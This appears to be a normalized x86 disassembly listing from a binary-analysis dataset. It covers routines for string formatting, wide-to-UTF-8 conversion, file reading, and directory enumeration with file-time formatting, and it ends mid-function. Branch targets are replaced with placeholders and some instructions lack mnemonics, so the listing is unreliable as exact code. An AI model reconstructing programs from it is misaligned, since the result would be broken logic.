mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_4134d0
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_412de0
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_403650
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_41ac09
mov esp ebp
pop ebp
retn
sub_413560
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
fld [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esp 0x8
fstp [ esp ]
lea eax [ ebp - 0xdc ]
push r--data
push eax
mov edx 0x6c
mov [ ebp - 0xe0 ] 0x0
call sub_412de0
add esp 0x10
xor ecx ecx
lea eax [ ebp - 0xdc ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
lea edx [ eax + 0x2 ]
nop
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0xdc ]
push edx
mov ecx esi
call sub_403650
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_41ac09
mov esp ebp
pop ebp
retn
sub_4135f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e5bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
xor ebx ebx
xor eax eax
mov [ edi + 0x1c ] 0x7
mov [ edi + 0x18 ] ebx
mov [ edi + 0x8 ] ax
lea esi [ edi + 0x24 ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_419f97
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_41ac98
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea eax [ edi + 0x3c ]
mov [ eax + 0x14 ] 0x7
mov [ eax ] dx
mov [ edi + 0x4 ] ecx
cmp [ eax + 0x14 ] 0x8
mov [ eax + 0x10 ] ebx
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax ]
sub_4136c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e609
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] edi
cmp [ ebp + 0x20 ] 0x8
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
jae r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
lea eax [ ebx + ebx + 0x2 ]
push 0x1
push eax
call sub_41acef
add esp 0x8
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
call sub_413080
mov edi [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0x4 ] 0x2
cmp edi eax
jne r-xdata
lea eax [ ebp + 0xc ]
cmp [ ebp + 0x20 ] 0x8
mov ecx [ ebp + 0xc ]
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
lea edx [ eax + 0x1 ]
push 0x0
push 0x0
lea eax [ ebx + ebx + 0x2 ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea ecx [ eax + 0x1 ]
lea ecx [ ebp + 0xc ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push 0x0
mov ecx esi
call sub_4076d0
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x4 ] 0x1
test edi edi
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push edi
mov ecx esi
call sub_4076d0
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x4 ] 0x1
test edi edi
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0xc ]
push eax
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
lea eax [ edi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
call sub_41a0d6
add esp 0x4
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
sub_413870
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push esi
mov esi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_4077d0
mov esi [ ebp + 0x8 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] dx
call sub_403a40
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ecx + 0x14 ]
sub ebx esi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_407400
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_403a40
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413900
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_4131d0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_403a40
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_413960
push ebp
mov ebp esp
push 0xffffffff
push sub_42e66b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x70 ] ecx
push 0x1
xor eax eax
mov edi 0x7
xor ebx ebx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
call sub_403650
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_407e50
lea ecx [ ebp + 0x24 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x3
call sub_407e00
add esp 0x18
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] edi
mov edi [ CreateFileW@IAT ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
lea ebx [ ebx ]
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x80000000
push eax
call edi
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x2c ]
push ebx
push esi
call [ GetFileSize@IAT ]
mov edi eax
mov eax [ ebp - 0x70 ]
cmp edi [ eax + 0x4 ]
jbe r-xdata
call [ GetLastError@IAT ]
cmp eax 0x20
jne r-xdata
push edi
call sub_41ae2a
add esp 0x4
push ebx
lea ecx [ ebp - 0x78 ]
push ecx
push edi
push eax
push esi
mov [ ebp - 0x74 ] eax
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov esi 0x8
jmp r-xdata
push 0x40
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
xor eax eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x7c ] esp
push 0xffffffff
push ebx
lea eax [ ebp + 0x24 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_401ae0
sub esp 0x1c
mov eax esp
mov [ ebp - 0x6c ] esp
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
xor edx edx
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
push ebx
lea edx [ ebp + 0x24 ]
push edx
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x6c ] eax
call sub_401ae0
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x70 ]
push eax
call sub_4136c0
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x7
call sub_4132f0
xor ebx ebx
jmp r-xdata
xor eax eax
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov edi 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
mov ecx [ ebp - 0x70 ]
add ecx 0x24
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x68 ] eax
call sub_413120
push esi
call [ CloseHandle@IAT ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x24 ]
push edx
call sub_41a0d6
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x24 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp + 0x24 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x38
xor eax eax
mov eax [ ebp + 0x24 ]
push eax
call sub_41a0d6
add esp 0x4
sub_413cf0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
lea esi [ ecx + 0x8 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push esi
mov ecx edi
mov [ ebp - 0x4 ] 0x0
mov [ edi ] ax
call sub_401ae0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] 0x0
jb r-xdata
xor ecx ecx
mov eax edi
pop edi
mov [ esi ] cx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ esi ]
sub_413d40
push ebp
mov ebp esp
push 0xffffffff
push sub_42ec6f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6cc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x6b4 ] ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x7
xor eax eax
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x224 ] ax
xor ecx ecx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] cx
push 0x18
mov [ ebp - 0x4 ] 0x3
call sub_41ac18
add esp 0x4
mov [ ebp - 0x6bc ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_412420
mov edi eax
jmp r-xdata
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x41c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x41c ] ax
call sub_403650
lea ecx [ ebp - 0x41c ]
push ecx
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x448 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_407e50
lea ecx [ ebp + 0x24 ]
push ecx
push eax
lea edx [ ebp - 0x320 ]
push edx
mov [ ebp - 0x4 ] 0xa
call sub_407e00
add esp 0x18
mov edi 0x8
cmp [ ebp - 0x434 ] edi
jb r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_4124b0
push 0x2e
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x3e4 ]
push edx
mov ecx edi
call sub_412790
push 0x30
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x5
call sub_412490
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edi
call sub_412790
push 0x30
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_412490
lea ecx [ ebp - 0x400 ]
push ecx
mov ecx edi
call sub_412790
push 0x16
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x7
call sub_412490
lea edx [ ebp - 0x3c8 ]
push edx
mov ecx edi
call sub_412790
mov [ ebp - 0x4 ] 0x8
cmp edi ebx
je r-xdata
xor ecx ecx
mov [ ebp - 0x434 ] esi
mov [ ebp - 0x438 ] ebx
mov [ ebp - 0x448 ] cx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x408 ] edi
jb r-xdata
mov eax [ ebp - 0x448 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x41c ] ax
mov eax [ ebp - 0x320 ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] ebx
cmp [ ebp - 0x30c ] edi
jae r-xdata
mov edx [ ebp - 0x41c ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x6a8 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x6c4 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x320 ]
call [ GetLastError@IAT ]
push ebx
push eax
lea ecx [ ebp - 0x198 ]
push ecx
call sub_4134d0
add esp 0xc
mov [ ebp - 0x6ac ] eax
push r--data
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x62
call sub_403cc0
push eax
lea edx [ ebp - 0x3e4 ]
push edx
lea eax [ ebp - 0x10c ]
push eax
mov [ ebp - 0x4 ] 0x63
call sub_407e50
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x144 ]
push edx
mov [ ebp - 0x4 ] 0x64
call sub_407e00
lea ecx [ ebp - 0x400 ]
push ecx
push eax
lea edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x4 ] 0x65
call sub_407e00
lea ecx [ ebp - 0x320 ]
push ecx
push eax
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x66
call sub_407e00
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x67
call sub_407e00
mov ecx [ ebp - 0x6ac ]
push ecx
push eax
lea edx [ ebp - 0x160 ]
push edx
mov [ ebp - 0x4 ] 0x68
call sub_413870
add esp 0x48
lea ecx [ ebp - 0x3c8 ]
push ecx
push eax
lea edx [ ebp - 0x17c ]
push edx
mov [ ebp - 0x4 ] 0x69
call sub_407e00
add esp 0xc
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x6a
call sub_403a40
cmp [ ebp - 0x168 ] edi
jb r-xdata
lea ebx [ ebx ]
xor ecx ecx
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] ebx
mov [ ebp - 0x17c ] cx
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov eax [ ebp - 0x17c ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ ebp + 0x40 ] bl
jne r-xdata
xor eax eax
mov [ ebp - 0xb8 ] ax
lea eax [ ebp - 0x67c ]
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
lea ecx [ eax + 0x2 ]
xor eax eax
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x160 ] ax
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0x6c4 ]
lea ecx [ ebp - 0x6a8 ]
push ecx
push edx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
xor edx edx
lea eax [ ebp - 0x67c ]
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] dx
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea ecx [ ebp - 0x67c ]
push ecx
lea ecx [ ebp - 0xb8 ]
call sub_403650
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
call sub_403650
movzx eax [ ebp - 0x44e ]
mov [ ebp - 0x6b0 ] eax
sub esp 0x8
lea ecx [ ebp - 0x2c ]
fild [ ebp - 0x6b0 ]
mov [ ebp - 0x4 ] 0xf
fstp [ esp ]
push ecx
call sub_413560
add esp 0xc
mov edi eax
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x10
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
call sub_403650
movzx eax [ ebp - 0x450 ]
mov [ ebp - 0x6b0 ] eax
sub esp 0x8
lea ecx [ ebp - 0xd4 ]
fild [ ebp - 0x6b0 ]
mov [ ebp - 0x4 ] 0x11
fstp [ esp ]
push ecx
call sub_413560
add esp 0xc
mov [ ebp - 0x6ac ] eax
push 0xa
xor edx edx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x12
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
call sub_403650
movzx eax [ ebp - 0x458 ]
mov [ ebp - 0x6b0 ] eax
sub esp 0x8
lea ecx [ ebp - 0x128 ]
fild [ ebp - 0x6b0 ]
mov [ ebp - 0x4 ] 0x13
fstp [ esp ]
push ecx
call sub_413560
add esp 0xc
mov [ ebp - 0x6c0 ] eax
xor edx edx
push 0x1
mov [ ebp - 0x4 ] 0x14
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1b4 ] dx
push r--data
lea ecx [ ebp - 0x1b4 ]
call sub_403650
movzx eax [ ebp - 0x456 ]
mov [ ebp - 0x6b0 ] eax
sub esp 0x8
lea ecx [ ebp - 0x144 ]
fild [ ebp - 0x6b0 ]
mov [ ebp - 0x4 ] 0x15
fstp [ esp ]
push ecx
call sub_413560
add esp 0xc
mov [ ebp - 0x6b8 ] eax
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x4 ] 0x16
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
mov [ ebp - 0x1d0 ] dx
call sub_403650
movzx eax [ ebp - 0x452 ]
mov [ ebp - 0x6b0 ] eax
sub esp 0x8
lea ecx [ ebp - 0x10c ]
fild [ ebp - 0x6b0 ]
mov [ ebp - 0x4 ] 0x17
fstp [ esp ]
push ecx
call sub_413560
mov [ ebp - 0x6b0 ] eax
mov edx [ ebp - 0x688 ]
push ebx
push edx
lea eax [ ebp - 0xf0 ]
push eax
mov [ ebp - 0x4 ] 0x18
call sub_4134d0
push eax
lea ecx [ ebp - 0x3e4 ]
push ecx
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x19
call sub_407e50
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x2cc ]
push edx
mov [ ebp - 0x4 ] 0x1a
call sub_407e00
mov ecx [ ebp - 0x6b0 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x1b
call sub_413870
lea ecx [ ebp - 0x1d0 ]
push ecx
push eax
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x1c
call sub_413870
add esp 0x48
mov ecx [ ebp - 0x6b8 ]
push ecx
mov [ ebp - 0x4 ] 0x1d
push eax
lea edx [ ebp - 0x294 ]
push edx
call sub_413870
lea ecx [ ebp - 0x1b4 ]
push ecx
push eax
lea edx [ ebp - 0x2e8 ]
push edx
mov [ ebp - 0x4 ] 0x1e
call sub_413870
mov ecx [ ebp - 0x6c0 ]
push ecx
push eax
lea edx [ ebp - 0x2b0 ]
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_413870
lea ecx [ ebp - 0x64 ]
push ecx
push eax
lea edx [ ebp - 0x278 ]
push edx
mov [ ebp - 0x4 ] 0x20
call sub_413870
mov ecx [ ebp - 0x6ac ]
push ecx
push eax
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x21
call sub_413870
lea ecx [ ebp - 0x80 ]
push ecx
push eax
lea edx [ ebp - 0x304 ]
push edx
mov [ ebp - 0x4 ] 0x22
call sub_413870
add esp 0x48
push edi
push eax
lea eax [ ebp - 0x33c ]
push eax
mov [ ebp - 0x4 ] 0x23
call sub_413870
lea ecx [ ebp - 0x400 ]
push ecx
push eax
lea edx [ ebp - 0x374 ]
push edx
mov [ ebp - 0x4 ] 0x24
call sub_407e00
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x390 ]
push edx
mov [ ebp - 0x4 ] 0x25
call sub_407e00
lea ecx [ ebp - 0x9c ]
push ecx
push eax
lea edx [ ebp - 0x358 ]
push edx
mov [ ebp - 0x4 ] 0x26
call sub_413870
lea ecx [ ebp - 0xb8 ]
push ecx
mov [ ebp - 0x4 ] 0x27
push eax
lea edx [ ebp - 0x3ac ]
push edx
call sub_413870
add esp 0x3c
mov edi eax
lea eax [ ebp - 0x48 ]
cmp eax edi
je r-xdata
xor edx edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
lea edx [ ebp - 0x42c ]
push edx
lea eax [ ebp - 0x69c ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea ecx [ ebp - 0x458 ]
push ecx
lea edx [ ebp - 0x42c ]
push edx
push ebx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
test [ ebp - 0x6a8 ] 0x10
jne r-xdata
mov eax [ ebp - 0x6c4 ]
push eax
call [ FindClose@IAT ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea eax [ ebp - 0x67c ]
push eax
lea ecx [ ebp - 0xb8 ]
call sub_403650
xor ecx ecx
push 0x1
mov [ ebp - 0x1d0 ] cx
push r--data
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x4 ] 0x45
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
call sub_403650
movzx edx [ ebp - 0x44e ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x17c ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x46
fstp [ esp ]
push eax
call sub_413560
add esp 0xc
mov edi eax
xor ecx ecx
push 0x1
mov [ ebp - 0x1b4 ] cx
push r--data
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x47
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
call sub_403650
movzx edx [ ebp - 0x450 ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x160 ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x48
fstp [ esp ]
push eax
call sub_413560
add esp 0xc
